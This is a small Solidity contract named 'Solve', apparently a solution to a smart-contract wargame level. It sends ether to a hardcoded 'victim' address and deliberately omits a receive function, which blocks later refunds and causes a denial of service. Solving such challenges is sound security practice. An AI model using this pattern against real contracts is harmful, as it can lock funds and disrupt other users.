// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Solve {
    // create & run() with 0.001 ether
    function run() public payable {
        address victim = 0x8CD3b33360a9D6B538CE9Ee81444B4B7f802Fd34;
        (bool result,) = victim.call{value: msg.value}("");
        if (!result) revert(); // optional
    }

    // No Receive
}